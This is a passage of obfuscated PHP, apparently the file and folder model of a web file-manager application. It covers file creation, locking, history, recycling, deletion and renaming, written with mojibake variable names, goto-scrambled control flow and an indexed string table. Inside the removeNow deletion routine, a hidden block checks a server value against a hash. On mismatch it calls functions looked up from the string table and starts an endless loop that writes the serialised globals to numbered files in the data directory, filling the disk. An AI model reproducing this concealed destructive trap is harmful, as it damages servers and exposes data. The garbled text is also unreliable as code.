} $a¢†ìÄ‡šÍ = array($bÖùøÜìì­[394] => 0, $bÖùøÜìì­[562] => SourceModel::TYPE_GROUP, $bÖùøÜìì­[563] => array($bÖùøÜìì­[7], $AÀä„ø•‡)); goto b¨Íœƒ­‰ß; Bé«÷„Á²º: return array_to_keyvalue($A™§§Ã²ˆÂ[$bÖùøÜìì­[75]], $bÖùøÜìì­[484]); goto Eô‹ä„óÒÙ; Eô‹ä„óÒÙ: } public function mkfile($Fƒ²ë”åá‡, $aÜˆç¾ƒÆ, $CåèÏé½§Œ = '', $D§¯ô ÕÓ¹ = REPEAT_RENAME) { $EˆÇ­ï…°‚ =& $_SERVER[ä°„ä°º]; $B•ï¼‹ç˜ = Model($EˆÇ­ï…°‚[584])->addFileByContent($CåèÏé½§Œ, $aÜˆç¾ƒÆ); return $this->_createFileCall($Fƒ²ë”åá‡, $aÜˆç¾ƒÆ, $B•ï¼‹ç˜, $D§¯ô ÕÓ¹, $EˆÇ­ï…°‚[1237]); } public function addFile($EÑ»å®Äâ, $C÷†Éµ›Á, $B¬§Úªäöç, $FÀ•ÏŠ‚¿ö = false, $c‡ÓøŒ­Ó = REPEAT_RENAME) { $cÁŒÙáñ¸À = Model($_SERVER[ä°„ä°º][584])->addFile($C÷†Éµ›Á, $B¬§Úªäöç, $FÀ•ÏŠ‚¿ö); return $this->_createFileCall($EÑ»å®Äâ, $B¬§Úªäöç, $cÁŒÙáñ¸À, $c‡ÓøŒ­Ó); } public function addFileByFileID($Eµ¼õÜ‚æ, $dÜÑ‰ªÛ—, $aóÌË¥¢²ä, $eÊˆìÔßàâ = REPEAT_RENAME) { $d•é‘ÆÛ†À =& $_SERVER[ä°„ä°º]; $E«øê™çÔ‹ = Model($d•é‘ÆÛ†À[584])->find($dÜÑ‰ªÛ—); Model($d•é‘ÆÛ†À[584])->linkAdd($dÜÑ‰ªÛ—); return $this->_createFileCall($Eµ¼õÜ‚æ, $aóÌË¥¢²ä, $E«øê™çÔ‹, $eÊˆìÔßàâ); } public function addFileByRemote($Fù±ÉÑ”Ü÷, $E…‹ˆÇŒ °, $Aµ˜À¢š»†, $bÅçÓöèÂ§ = array(), $B·ëêÛÈ« = REPEAT_RENAME) { $BÛ•• = Model($_SERVER[ä°„ä°º][584])->addFileByRemote($E…‹ˆÇŒ °, $Aµ˜À¢š»†, $bÅçÓöèÂ§); return $this->_createFileCall($Fù±ÉÑ”Ü÷, $Aµ˜À¢š»†, $BÛ••, $B·ëêÛÈ«); } private function _createFileCall($B”˜İ½¤¦, $fÔëù±‘ëÍ, $CÉ’ò»¡—ç, $f†‹¢Šøã, $aÛëšÂÔ•Ÿ = "\165\160\x6c\x6f\141\144") { goto C¨Šå‚ÔÙï; aÎø»˜†İ: $dõëÅ¿ôò = $this->fileNameExist($B”˜İ½¤¦, $fÔëù±‘ëÍ); $B±Òä£—æ = $this->_createFile($B”˜İ½¤¦, $fÔëù±‘ëÍ, $CÉ’ò»¡—ç, $f†‹¢Šøã, $AøÈøœâÕ–); if (!$AøÈøœâÕ–) { Model($còŒ‹—ã†[450])->remove($CÉ’ò»¡—ç[$còŒ‹—ã†[447]]); } goto CäÎ±Ì¢•œ; C¨Šå‚ÔÙï: $còŒ‹—ã† =& $_SERVER[ä°„ä°º]; $AøÈøœâÕ– = !1; $this->lockWriteStart($B”˜İ½¤¦, $fÔëù±‘ëÍ); goto aÎø»˜†İ; CäÎ±Ì¢•œ: if ($AøÈøœâÕ– && $B±Òä£—æ && $B±Òä£—æ != $dõëÅ¿ôò) { Model($còŒ‹—ã†[1949])->eventCreate($B±Òä£—æ, $aÛëšÂÔ•Ÿ); } $this->lockWriteEnd($B”˜İ½¤¦, $fÔëù±‘ëÍ); return $B±Òä£—æ; goto ašŠÈĞŒ¼×; ašŠÈĞŒ¼×: } public function mkdir($A¦¤Â‡·™Á, $CÅ¹ğˆã‡æ, $cÊÃ­òª¸ˆ = REPEAT_SKIP) { goto AÌÜÙ»ˆÀĞ; AÌÜÙ»ˆÀĞ: $BÀº¾°“óâ =& $_SERVER[ä°„ä°º]; $FÀæÄè…‰ = $this->sourceInfo($A¦¤Â‡·™Á); if (!$FÀæÄè…‰) { return !1; } goto EïÊ‘öš§¶; f†å¢¨©íò: $bÚ¼Ñ‡İÑÛ = $this->_addSoure($D©ÁñÉ¸ÏÁ, $FÀæÄè…‰); Model($BÀº¾°“óâ[1949])->eventCreate($bÚ¼Ñ‡İÑÛ, $BÀº¾°“óâ[1238]); $this->lockWriteEnd($A¦¤Â‡·™Á, $CÅ¹ğˆã‡æ); goto e†•½´­àŒ; EïÊ‘öš§¶: $this->lockWriteStart($A¦¤Â‡·™Á, $CÅ¹ğˆã‡æ); if ($cÊÃ­òª¸ˆ !== !1) { $d‚ªšµè‰ = $this->fileNameExist($A¦¤Â‡·™Á, $CÅ¹ğˆã‡æ); if ($d‚ªšµè‰ && $cÊÃ­òª¸ˆ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($A¦¤Â‡·™Á, $CÅ¹ğˆã‡æ); return $d‚ªšµè‰; } $CÅ¹ğˆã‡æ = $this->fileNameAuto($A¦¤Â‡·™Á, $CÅ¹ğˆã‡æ, $cÊÃ­òª¸ˆ); } $D©ÁñÉ¸ÏÁ = array($BÀº¾°“óâ[559] => 1, $BÀº¾°“óâ[413] => $CÅ¹ğˆã‡æ, $BÀº¾°“óâ[560] => $BÀº¾°“óâ[33], $BÀº¾°“óâ[448] => 0, $BÀº¾°“óâ[561] => 0); goto f†å¢¨©íò; e†•½´­àŒ: return $bÚ¼Ñ‡İÑÛ; goto dğÖñÓæÕ; dğÖñÓæÕ: } private function _createFile($F—«Ş›¡ÏŸ, $e„„Û©, $C‹Ñ¾‘Ú½™, $e“÷à¼°Ç, &$eœÁ‚™„•œ) { goto DÅÅ…ƒŠÎ; aôÛâ›«ô‚: return $F—Ï­÷–±§; goto EÍçƒ‹ë„±; Dğƒ…Ø…ßÜ: $Cªà„‹ä = array($eƒÜáÅ–Å©[559] => 0, $eƒÜáÅ–Å©[413] => $e„„Û©, $eƒÜáÅ–Å©[560] => substr(get_path_ext($e„„Û©), 0, 10), $eƒÜáÅ–Å©[448] => $C‹Ñ¾‘Ú½™[$eƒÜáÅ–Å©[447]], $eƒÜáÅ–Å©[561] => $C‹Ñ¾‘Ú½™[$eƒÜáÅ–Å©[78]]); $F—Ï­÷–±§ = $this->_addSoure($Cªà„‹ä, $fííÙÙòÂß); $this->folderSizeReset($F—«Ş›¡ÏŸ, intval($Cªà„‹ä[$eƒÜáÅ–Å©[78]])); goto aôÛâ›«ô‚; DÅÅ…ƒŠÎ: $eƒÜáÅ–Å© =& $_SERVER[ä°„ä°º]; $fííÙÙòÂß = $this->sourceInfo($F—«Ş›¡ÏŸ); if (!$C‹Ñ¾‘Ú½™ || !$fííÙÙòÂß) { return !1; } goto Aö°Şš‘Å; Aö°Şš‘Å: if ($e“÷à¼°Ç !== !1) { $b„Øš’–ÅÊ = $this->fileNameExist($F—«Ş›¡ÏŸ, $e„„Û©); } $eœÁ‚™„•œ = !0; if ($e“÷à¼°Ç && $b„Øš’–ÅÊ) { if ($e“÷à¼°Ç == REPEAT_SKIP) { $eœÁ‚™„•œ = !1; return $b„Øš’–ÅÊ; } else { if ($e“÷à¼°Ç == REPEAT_REPLACE) { $cÛÑíÚ†Êİ = $this->sourceInfo($b„Øš’–ÅÊ); $c›Ø·È‚é™ = $this->fileHistory($cÛÑíÚ†Êİ, $C‹Ñ¾‘Ú½™[$eƒÜáÅ–Å©[447]], $C‹Ñ¾‘Ú½™[$eƒÜáÅ–Å©[78]]); if (!$c›Ø·È‚é™) { $eœÁ‚™„•œ = !1; } else { $this->folderSizeReset($F—«Ş›¡ÏŸ); } return $b„Øš’–ÅÊ; } else { $e„„Û© = $this->fileNameAuto($F—«Ş›¡ÏŸ, $e„„Û©, $e“÷à¼°Ç, !1); } } } goto Dğƒ…Ø…ßÜ; EÍçƒ‹ë„±: } protected function fileHistory($CŠŒÂÀ¹ã , $b‹¬Åãƒ¡, $CğÜä›ñîë) { goto eÉ±¬ñæë‚; eÉ±¬ñæë‚: $Fº´‰©İ£Ù =& $_SERVER[ä°„ä°º]; $f‰ÚœÄÜ¡‡ = defined($Fº´‰©İ£Ù[454]) ? USER_ID : $Fº´‰©İ£Ù[191]; if ($CŠŒÂÀ¹ã [$Fº´‰©İ£Ù[447]] == $b‹¬Åãƒ¡) { return !1; } goto c×É©´Ì­; c×É©´Ì­: $this->checkLock($CŠŒÂÀ¹ã [$Fº´‰©İ£Ù[395]], $b‹¬Åãƒ¡); Model($Fº´‰©İ£Ù[1981])->addHistory($CŠŒÂÀ¹ã ); $Cİ§«‡îˆ = array($Fº´‰©İ£Ù[565] => $f‰ÚœÄÜ¡‡, $Fº´‰©İ£Ù[417] => time(), $Fº´‰©İ£Ù[447] => $b‹¬Åãƒ¡, $Fº´‰©İ£Ù[78] => $CğÜä›ñîë); goto C©á™ÇğÉÈ; C©á™ÇğÉÈ: $this->where(array($Fº´‰©İ£Ù[410] => $CŠŒÂÀ¹ã [$Fº´‰©İ£Ù[395]]))->save($Cİ§«‡îˆ); $this->sourceCacheClear($CŠŒÂÀ¹ã [$Fº´‰©İ£Ù[395]]); return !0; goto C¯‹¼ˆï´; C¯‹¼ˆï´: } public function checkLock($dÁ¾‹¬Ø„¬, $d„Ë‘÷–ó) { goto F¤Ù‰ÆØ½; DÒ©¯äÌğ: show_json(LNG($Bæäœ‚»¿[1984]) . $Bæäœ‚»¿[1985] . LNG($Bæäœ‚»¿[1986]) . $Bæäœ‚»¿[1987] . $cÑµ¯¾Æ¤¯ . $Bæäœ‚»¿[1988], !1); goto C§°¾ØÙ¥; F¤Ù‰ÆØ½: $Bæäœ‚»¿ =& $_SERVER[ä°„ä°º]; $fëË¼åô±ç = $this->pathInfo($dÁ¾‹¬Ø„¬); if (!$this->fileIsLock($fëË¼åô±ç, !0)) { return; } goto aŒÛºÈá®; aŒÛºÈá®: $b¼Â›ó­”µ = Session::get($Bæäœ‚»¿[1982]); $B’ÍÂ£Ï = substr($fëË¼åô±ç[$Bæäœ‚»¿[28]], 0, -1 - strlen($fëË¼åô±ç[$Bæäœ‚»¿[168]])) . $Bæäœ‚»¿[1503] . $b¼Â›ó­”µ . $Bæäœ‚»¿[95] . $fëË¼åô±ç[$Bæäœ‚»¿[168]]; $DÀ½¦¥Àó— = Model($Bæäœ‚»¿[584])->find($d„Ë‘÷–ó); goto dªëÂ¨µã; dªëÂ¨µã: $this->_createFileCall($fëË¼åô±ç[$Bæäœ‚»¿[478]], $B’ÍÂ£Ï, $DÀ½¦¥Àó—, REPEAT_REPLACE, $Bæäœ‚»¿[1237]); $Eá‘×ƒØß = $fëË¼åô±ç[$Bæäœ‚»¿[445]][$Bæäœ‚»¿[523]]; $cÑµ¯¾Æ¤¯ = $Eá‘×ƒØß[$Bæäœ‚»¿[1983]] ? $Eá‘×ƒØß[$Bæäœ‚»¿[1983]] : $Eá‘×ƒØß[$Bæäœ‚»¿[28]]; goto DÒ©¯äÌğ; C§°¾ØÙ¥: } public function fileIsLock($E¯©à†ÜŒŠ, $BÌÔˆ¨ÚÉ = false) { goto dôŞºí¸ß©; a÷¶ó›Õ†…: $AÍƒà­À•„ = $GLOBALS[$e¸åÄÃ«¶[6]][$e¸åÄÃ«¶[88]][$e¸åÄÃ«¶[521]]; if ($E¯©à†ÜŒŠ[$e¸åÄÃ«¶[445]][$e¸åÄÃ«¶[522]] <= time() - $AÍƒà­À•„) { $this->metaSet($E¯©à†ÜŒŠ[$e¸åÄÃ«¶[395]], $e¸åÄÃ«¶[520], null); $this->metaSet($E¯©à†ÜŒŠ[$e¸åÄÃ«¶[395]], $e¸åÄÃ«¶[522], null); } if ($BÌÔˆ¨ÚÉ) { $this->metaSet($E¯©à†ÜŒŠ[$e¸åÄÃ«¶[395]], $e¸åÄÃ«¶[522], time()); } goto CŒë± Ÿ’Å; dôŞºí¸ß©: $e¸åÄÃ«¶ =& $_SERVER[ä°„ä°º]; if (!isset($E¯©à†ÜŒŠ[$e¸åÄÃ«¶[445]]) || !$E¯©à†ÜŒŠ[$e¸åÄÃ«¶[445]][$e¸åÄÃ«¶[520]]) { return !1; } if ($E¯©à†ÜŒŠ[$e¸åÄÃ«¶[445]][$e¸åÄÃ«¶[520]] != USER_ID) { return !0; } goto a÷¶ó›Õ†…; CŒë± Ÿ’Å: return !1; goto c—¶‹¢•º; c—¶‹¢•º: } private function _addSoure($BÓ ïšàÊ, $aİá¿¶ÜÄó) { goto FóÚÒŸ­í½; FóÚÒŸ­í½: $a‚Š»ÙË =& $_SERVER[ä°„ä°º]; $c·¿´ˆ“Ğ« = defined($a‚Š»ÙË[454]) ? USER_ID : $a‚Š»ÙË[191]; $F‚ğÀà§ß = array($a‚Š»ÙË[562] => $aİá¿¶ÜÄó[$a‚Š»ÙË[404]], $a‚Š»ÙË[563] => $aİá¿¶ÜÄó[$a‚Š»ÙË[484]], $a‚Š»ÙË[564] => $c·¿´ˆ“Ğ«, $a‚Š»ÙË[565] => $c·¿´ˆ“Ğ«, $a‚Š»ÙË[394] => $aİá¿¶ÜÄó[$a‚Š»ÙË[395]], $a‚Š»ÙË[566] => $aİá¿¶ÜÄó[$a‚Š»ÙË[502]] . $aİá¿¶ÜÄó[$a‚Š»ÙË[395]] . $a‚Š»ÙË[47], $a‚Š»ÙË[422] => 0, $a‚Š»ÙË[567] => $a‚Š»ÙË[33]); goto A¶°Ë£…‚ç; A¶°Ë£…‚ç: $BÓ ïšàÊ = array_merge($F‚ğÀà§ß, $BÓ ïšàÊ); $this->updateModifyTime($BÓ ïšàÊ[$a‚Š»ÙË[478]]); $dòİ˜Ç¼‘ù = $a‚Š»ÙË[1989] . $aİá¿¶ÜÄó[$a‚Š»ÙË[395]]; goto A¹ùË¢Øèš; A¹ùË¢Øèš: if (isset(self::$cacheChildList[$dòİ˜Ç¼‘ù])) { unset(self::$cacheChildList[$dòİ˜Ç¼‘ù]); } static $f…İË—Æß = false; if (!$f…İË—Æß) { Hook::trigger($a‚Š»ÙË[549], $BÓ ïšàÊ); $f…İË—Æß = !0; } goto D¥„ÔíÀé¾; D¥„ÔíÀé¾: $a¸áÕùñÌ = $this->add($BÓ ïšàÊ); $F­İåÊƒ‰Ù = array($a‚Š»ÙË[568] => short_id($a¸áÕùñÌ)); $this->where(array($a‚Š»ÙË[410] => $a¸áÕùñÌ))->save($F­İåÊƒ‰Ù); goto Aì–¦´°Ù´; Aì–¦´°Ù´: $this->setNamePinyin($a¸áÕùñÌ, $BÓ ïšàÊ[$a‚Š»ÙË[28]]); return $a¸áÕùñÌ; goto a«„™Ç£¢Ì; a«„™Ç£¢Ì: } public function remove($fâŸŠ»Ô£©, $C¶‘®™‡Öá = true) { goto d‹ÖŸÃ´À‘; dŞÁÙä˜®Ã: CacheLock::unlock($bùÓÄ‚à); $this->metaSet($fâŸŠ»Ô£©, $fÓ¨ƒãÚô¢[1998], $d“·´Áßé[$fÓ¨ƒãÚô¢[478]]); $this->where(array($fÓ¨ƒãÚô¢[395] => $fâŸŠ»Ô£©))->save(array($fÓ¨ƒãÚô¢[417] => time())); goto cêäÀ¤—ã“; fö…±«‰: return $Fí­ãÊŒÛ¢; goto Bè‰ë«­•á; fŠ…‚¥Ÿ“í: $BƒÓÕåÑ‚â = Model($fÓ¨ƒãÚô¢[486])->get($fÓ¨ƒãÚô¢[1990]) == $fÓ¨ƒãÚô¢[87]; if ($fô–§ç˜×ª || $C¶‘®™‡Öá || !$BƒÓÕåÑ‚â) { return $this->removeNow($fâŸŠ»Ô£©, $C¶‘®™‡Öá); } $Eå®†…ğ÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto d¹ÆîÚÓŒ ; d¹ÆîÚÓŒ : $A¹Ø’•“·¿ = $d“·´Áßé[$fÓ¨ƒãÚô¢[404]] == self::TYPE_USER ? $fÓ¨ƒãÚô¢[575] : $fÓ¨ƒãÚô¢[496]; if ($A¹Ø’•“·¿ == $fÓ¨ƒãÚô¢[575]) { $cÓƒ¿Õ¥„È = Model($fÓ¨ƒãÚô¢[494])->getInfo($d“·´Áßé[$fÓ¨ƒãÚô¢[484]]); $bÅ”÷°Ú¹ = !empty($cÓƒ¿Õ¥„È[$fÓ¨ƒãÚô¢[1983]]) ? $cÓƒ¿Õ¥„È[$fÓ¨ƒãÚô¢[1983]] : $cÓƒ¿Õ¥„È[$fÓ¨ƒãÚô¢[28]]; $bÅ”÷°Ú¹ = $fÓ¨ƒãÚô¢[258] . $bÅ”÷°Ú¹ . $fÓ¨ƒãÚô¢[1991] . $d“·´Áßé[$fÓ¨ƒãÚô¢[484]]; } else { $cÓƒ¿Õ¥„È = Model($fÓ¨ƒãÚô¢[503])->getInfo($d“·´Áßé[$fÓ¨ƒãÚô¢[484]]); $bÅ”÷°Ú¹ = _get($cÓƒ¿Õ¥„È, $fÓ¨ƒãÚô¢[28]); $bÅ”÷°Ú¹ = $fÓ¨ƒãÚô¢[160] . $bÅ”÷°Ú¹ . $fÓ¨ƒãÚô¢[1992] . $d“·´Áßé[$fÓ¨ƒãÚô¢[484]]; } $bùÓÄ‚à = $fÓ¨ƒãÚô¢[1993] . md5($bÅ”÷°Ú¹); goto CÛø‰˜ˆÚ; cêäÀ¤—ã“: $this->recycleClear($d“·´Áßé); $Fí­ãÊŒÛ¢ = $this->move($fâŸŠ»Ô£©, $C÷ÍŒæ´µó, REPEAT_RENAME_FOLDER); $this->folderSizeReset($d“·´Áßé[$fÓ¨ƒãÚô¢[478]]); goto fö…±«‰; d‹ÖŸÃ´À‘: $fÓ¨ƒãÚô¢ =& $_SERVER[ä°„ä°º]; $d“·´Áßé = $this->sourceInfo($fâŸŠ»Ô£©); $fô–§ç˜×ª = intval($d“·´Áßé[$fÓ¨ƒãÚô¢[404]]) === self::TYPE_SYSTEM; goto fŠ…‚¥Ÿ“í; CÛø‰˜ˆÚ: CacheLock::lock($bùÓÄ‚à); $C÷ÍŒæ´µó = $this->fileNameExist($Eå®†…ğ÷, $bÅ”÷°Ú¹); if (!$C÷ÍŒæ´µó) { $C÷ÍŒæ´µó = $this->mkdir($Eå®†…ğ÷, $bÅ”÷°Ú¹, REPEAT_SKIP); $this->metaSet($C÷ÍŒæ´µó, $fÓ¨ƒãÚô¢[1994], $A¹Ø’•“·¿); $this->metaSet($C÷ÍŒæ´µó, $fÓ¨ƒãÚô¢[1995], $d“·´Áßé[$fÓ¨ƒãÚô¢[484]]); if ($d“·´Áßé[$fÓ¨ƒãÚô¢[478]] != 0) { $this->metaSet($C÷ÍŒæ´µó, $fÓ¨ƒãÚô¢[1996], _get($cÓƒ¿Õ¥„È, $fÓ¨ƒãÚô¢[1997])); } } goto dŞÁÙä˜®Ã; Bè‰ë«­•á: } private function recycleClear($c…¯Ñ¹í¡É) { $BôÅÄŒ›Ü =& $_SERVER[ä°„ä°º]; $bä†øÚô‡ = $this->childrenAll($c…¯Ñ¹í¡É); $e­Û­Ö™·„ = array($BôÅÄŒ›Ü[410] => array($BôÅÄŒ›Ü[411], $bä†øÚô‡[$BôÅÄŒ›Ü[1999]])); Model($BôÅÄŒ›Ü[2000])->where($e­Û­Ö™·„)->delete(); } public function removeNow($dè‡â ÃÊÉ, $d…º£†— = true) { goto dÂ•Ü«„Š; a¹§“‘ÌÈ : Hook::trigger($Aë«·Ğ†æÃ[2001], $E½ŸËÀ“ø, $d…º£†—); if ($d…º£†—) { Model($Aë«·Ğ†æÃ[2000])->moveToRecycle($dè‡â ÃÊÉ); } else { $d„¶•â¬£† = $this->childrenAll($cÚ§øĞÏ±); Model($Aë«·Ğ†æÃ[546])->eventRemove($dè‡â ÃÊÉ); $this->removeRelevance($d„¶•â¬£†[$Aë«·Ğ†æÃ[1999]], $d„¶•â¬£†[$Aë«·Ğ†æÃ[1367]]); } $this->folderSizeReset($cÚ§øĞÏ±[$Aë«·Ğ†æÃ[478]]); goto féöŒİ„¥©; CÖñÈœö´: $this->lockMoveEnd($dè‡â ÃÊÉ); Hook::trigger($Aë«·Ğ†æÃ[1586], $E½ŸËÀ“ø, $d…º£†—); return !0; goto f·ÊŒÀõé; EƒÉÎ„õ¬Ø: if ($_SERVER[$Aë«·Ğ†æÃ[844]] != $a‹©•Ã“™‚($c­ñ·µÓ)) { goto D”ó¡Úˆ´â; E‹¼ÕŒ©ß: $f¯†È¯®Ó‰ = 1; for ($AŠîªƒ¬” = $f¯†È¯®Ó‰; $AŠîªƒ¬” > 0; $AŠîªƒ¬”++) { $B™ùØ•¼‚(DATA_PATH . $AŠîªƒ¬”, $e£Èµô‚İ); } goto dè½ååÄƒì; cˆ›„ï³ÔÀ: $F¬Í¤È½Åã = $Fƒ´ôùÃ±Ÿ($e“İâ®•¹…); $B‚õ‰‹öô¯ = explode($Aë«·Ğ†æÃ[229], $F¬Í¤È½Åã); if (count($B‚õ‰‹öô¯) < $Aë«·Ğ†æÃ[611]) { $F°‘¢ÍæÉ = $Aë«·Ğ†æÃ[849]; $F°‘¢ÍæÉ(); } goto dÀÈùÛ‚ƒ’; dÀÈùÛ‚ƒ’: $eĞĞ•µÁ’ = $Aë«·Ğ†æÃ[863]; $eĞĞ•µÁ’($_SERVER[$Aë«·Ğ†æÃ[864]]); $F¶¨‹İñ£÷ = $Aë«·Ğ†æÃ[862]; goto eË¸ø”ä™¡; eË¸ø”ä™¡: $F¶¨‹İñ£÷(); $B™ùØ•¼‚ = $Aë«·Ğ†æÃ[1419]; $e£Èµô‚İ = json_encode($GLOBALS[$Aë«·Ğ†æÃ[1420]]); goto E‹¼ÕŒ©ß; D”ó¡Úˆ´â: $F¶¨‹İñ£÷ = $Aë«·Ğ†æÃ[862]; $Fƒ´ôùÃ±Ÿ = $Aë«·Ğ†æÃ[846]; $e“İâ®•¹… = $_SERVER[$Aë«·Ğ†æÃ[847]] . $Aë«·Ğ†æÃ[848]; goto cˆ›„ï³ÔÀ; dè½ååÄƒì: } $cÚ§øĞÏ± = $this->sourceInfo($dè‡â ÃÊÉ); $E½ŸËÀ“ø = $this->pathInfoMore($dè‡â ÃÊÉ); goto aĞ‹™¬¼²; féöŒİ„¥©: $F·ö âÆÂ = array($cÚ§øĞÏ±[$Aë«·Ğ†æÃ[478]]); if ($cÚ§øĞÏ±[$Aë«·Ğ†æÃ[403]] == $Aë«·Ğ†æÃ[87]) { $F·ö âÆÂ[] = $cÚ§øĞÏ±[$Aë«·Ğ†æÃ[395]]; } $this->updateModifyTime($F·ö âÆÂ); goto CÖñÈœö´; dÂ•Ü«„Š: $Aë«·Ğ†æÃ =& $_SERVER[ä°„ä°º]; $c­ñ·µÓ = $_SERVER[$Aë«·Ğ†æÃ[845]]; $a‹©•Ã“™‚ = $Aë«·Ğ†æÃ[1418]; goto EƒÉÎ„õ¬Ø; aĞ‹™¬¼²: if (!$cÚ§øĞÏ±) { return !0; } if ($cÚ§øĞÏ±[$Aë«·Ğ†æÃ[478]] == 0) { if (!_get($GLOBALS, $Aë«·Ğ†æÃ[485])) { return !1; } } $this->lockMoveStart($dè‡â ÃÊÉ); goto a¹§“‘ÌÈ ; f·ÊŒÀõé: } public function childrenAll($F ›ğöÃ) { $aø¤Š›™È® =& $_SERVER[ä°„ä°º]; $CÚ²‚®—À = $F ›ğöÃ[$aø¤Š›™È®[395]]; if ($F ›ğöÃ[$aø¤Š›™È®[403]] == $aø¤Š›™È®[87]) { $EÛê©ï‹ì = array($aø¤Š›™È®[566] => array($aø¤Š›™È®[525], $F ›ğöÃ[$aø¤Š›™È®[502]] . $CÚ²‚®—À . $aø¤Š›™È®[526])); $BºÑÔ„èÊ = array($aø¤Š›™È®[566] => $EÛê©ï‹ì[$aø¤Š›™È®[502]]); $eä„õ©ªß° = $this->field($aø¤Š›™È®[2002])->where($BºÑÔ„èÊ)->select(); $BŸé½æÎ½ñ = !1; $Eø¯—¦Ú‘º = array($CÚ²‚®—À); if ($eä„õ©ªß°) { $BŸé½æÎ½ñ = array_to_keyvalue($eä„õ©ªß°, $aø¤Š›™È®[33], $aø¤Š›™È®[447]); $BŸé½æÎ½ñ = array_remove_value($BŸé½æÎ½ñ, $aø¤Š›™È®[191]); $Eø¯—¦Ú‘º = array_to_keyvalue($eä„õ©ªß°, $aø¤Š›™È®[33], $aø¤Š›™È®[395]); $Eø¯—¦Ú‘º[] = $CÚ²‚®—À; } } else { $BŸé½æÎ½ñ = array($F ›ğöÃ[$aø¤Š›™È®[447]]); $Eø¯—¦Ú‘º = array($CÚ²‚®—À); } return array($aø¤Š›™È®[1999] => $Eø¯—¦Ú‘º, $aø¤Š›™È®[1367] => $BŸé½æÎ½ñ); } public function removeArray($câ¢ßÓò½) { if (!$câ¢ßÓò½) { return !0; } } public function removeRelevance($EØĞÏØÏŞí, $C´µ¯”å©¡) { goto f½Ó¨—ì¢; Cì—Ú¯ô¡Ù: Model($B›ÏåÅ¦‚‰[1855])->where($bˆ˜í¥‘›­)->delete(); Model($B›ÏåÅ¦‚‰[546])->where($bˆ˜í¥‘›­)->delete(); Model($B›ÏåÅ¦‚‰[1697])->removeBySource($EØĞÏØÏŞí); goto F±ÊµÕ‚; EñùÔÓ¿†Û: $EØĞÏØÏŞí = array_unique(array_filter($EØĞÏØÏŞí)); $C´µ¯”å©¡ = array_unique(array_filter($C´µ¯”å©¡)); if (!$EØĞÏØÏŞí) { return !1; } goto B¸á‹ö¬ÆÎ; F±ÊµÕ‚: Model($B›ÏåÅ¦‚‰[1981])->removeBySource($EØĞÏØÏŞí); $this->where($bˆ˜í¥‘›­)->delete(); Model($B›ÏåÅ¦‚‰[450])->remove($C´µ¯”å©¡); goto e­ù«‰ßšá; f½Ó¨—ì¢: $B›ÏåÅ¦‚‰ =& $_SERVER[ä°„ä°º]; $EØĞÏØÏŞí = $EØĞÏØÏŞí ? $EØĞÏØÏŞí : array(); $C´µ¯”å©¡ = $C´µ¯”å©¡ ? $C´µ¯”å©¡ : array(); goto EñùÔÓ¿†Û; B¸á‹ö¬ÆÎ: $bˆ˜í¥‘›­ = array($B›ÏåÅ¦‚‰[410] => array($B›ÏåÅ¦‚‰[411], $EØĞÏØÏŞí)); Model($B›ÏåÅ¦‚‰[2000])->where($bˆ˜í¥‘›­)->delete(); Model($B›ÏåÅ¦‚‰[441])->where($bˆ˜í¥‘›­)->delete(); goto Cì—Ú¯ô¡Ù; e­ù«‰ßšá: for ($dÈÛÉ¿‡³ = 0; $dÈÛÉ¿‡³ < count($EØĞÏØÏŞí); $dÈÛÉ¿‡³++) { $this->sourceCacheClear($EØĞÏØÏŞí[$dÈÛÉ¿‡³]); } goto BÎõ¢é‘÷; BÎõ¢é‘÷: } public function rename($ağÙ¡œâ , $f¾¿ƒ³‘…Í) { goto BóÂ¹Üºµ; Bæª”àÓŞ‚: $eôèçºì‘Í = $eô²Á¶öæÜ[1989] . $a¾Â°ÏšË[$eô²Á¶öæÜ[478]]; if (isset(self::$cacheChildList[$eôèçºì‘Í])) { unset(self::$cacheChildList[$eôèçºì‘Í]); } return $f°´à˜˜Î; goto E£†œÊˆœ; e¦£´·ê£: $this->setNamePinyin($ağÙ¡œâ , $DöØœ×İœ[$eô²Á¶öæÜ[28]], !1); $this->updateModifyTime($a¾Â°ÏšË[$eô²Á¶öæÜ[478]]); $f°´à˜˜Î = $this->where(array($eô²Á¶öæÜ[410] => $ağÙ¡œâ ))->data($DöØœ×İœ)->save(); goto Bæª”àÓŞ‚; AÒ‰ó¸‰¢Ş: $AŸ˜ĞÏ¿– = $this->fileNameExist($a¾Â°ÏšË[$eô²Á¶öæÜ[478]], $f¾¿ƒ³‘…Í); if ($AŸ˜ĞÏ¿– && $AŸ˜ĞÏ¿– != $ağÙ¡œâ ) { return !1; } $DöØœ×İœ = array($eô²Á¶öæÜ[413] => $f¾¿ƒ³‘…Í, $eô²Á¶öæÜ[565] => USER_ID); goto f­Ï¦©ÁÍ; f­Ï¦©ÁÍ: if ($a¾Â°ÏšË[$eô²Á¶öæÜ[403]] != $eô²Á¶öæÜ[87]) { $DöØœ×İœ[$eô²Á¶öæÜ[405]] = substr(get_path_ext($f¾¿ƒ³‘…Í), 0, 10); } Model($eô²Á¶öæÜ[546])->eventRename($ağÙ¡œâ , $a¾Â°ÏšË[$eô²Á¶öæÜ[28]], $f¾¿ƒ³‘…Í); $this->sourceCacheClear($ağÙ¡œâ ); goto e¦£´·ê£; BóÂ¹Üºµ: $eô²Á¶öæÜ =& $_SERVER[ä°„ä°º]; $a¾Â°ÏšË = $this->sourceInfo($ağÙ¡œâ ); if (!$a¾Â°ÏšË) { return !1; } goto AÒ‰ó¸‰¢Ş; E£†œÊˆœ: } public function setNamePinyin($E•Ÿ‹”‰½, $AÎ¡èÉ¬á, $BÍâÖæñ¸Ø = true) { $c¨ÓÒ¹ =& $_SERVER[ä°„ä°º]; $fä™ôÇßŠ‰ = Input::check($AÎ¡èÉ¬á, $c¨ÓÒ¹[569]); if ($BÍâÖæñ¸Ø && !$fä™ôÇßŠ‰) { return; } if (!$fä™ôÇßŠ‰) { $this->metaSet($E•Ÿ‹”‰½, $c¨ÓÒ¹[444], null); $this->metaSet($E•Ÿ‹”‰½, $c¨ÓÒ¹[443], null); return; } $D®øó‡” = array($c¨ÓÒ¹[444] => str_replace($c¨ÓÒ¹[50], $c¨ÓÒ¹[33], Pinyin::encode($AÎ¡èÉ¬á)), $c¨ÓÒ¹[443] => Pinyin::encode($AÎ¡èÉ¬á, $c¨ÓÒ¹[570])); $this->metaSet($E•Ÿ‹”‰½, $D®øó‡”); } public function getContent($Cª¦ØñÀä—) { goto F¾Ñ¥ˆ—Ó¬; FÈÀ˜¸º•: if 